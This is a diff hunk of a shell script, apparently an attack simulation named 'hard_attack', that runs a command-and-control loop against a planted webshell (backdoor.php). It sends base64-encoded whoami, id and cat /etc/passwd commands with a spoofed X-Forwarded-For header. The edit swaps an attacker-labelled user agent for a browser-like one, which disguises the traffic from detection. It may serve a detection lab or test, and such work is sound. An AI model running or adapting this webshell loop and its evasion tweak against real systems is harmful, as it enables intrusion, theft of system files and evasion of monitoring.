@@ -15,15 +15,15 @@ echo "hard_attack: backdoor planted, starting C2 loop"
 while true; do
     # Send encoded shell commands to the webshell
     curl -s -H "X-Forwarded-For: 10.0.0.3" \
-        -A "curl/8.14.1 (AttackerPID: $$)" \
+        -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 [$$]" \
         "http://localhost/backdoor.php?cmd=$(echo -n 'whoami' | base64)" > /dev/null
     sleep 1
     curl -s -H "X-Forwarded-For: 10.0.0.3" \
-        -A "curl/8.14.1 (AttackerPID: $$)" \
+        -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 [$$]" \
         "http://localhost/backdoor.php?cmd=$(echo -n 'id' | base64)" > /dev/null
     sleep 1
     curl -s -H "X-Forwarded-For: 10.0.0.3" \
-        -A "curl/8.14.1 (AttackerPID: $$)" \
+        -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 [$$]" \
         "http://localhost/backdoor.php?cmd=$(echo -n 'cat /etc/passwd' | base64)" > /dev/null
     sleep 2
 done
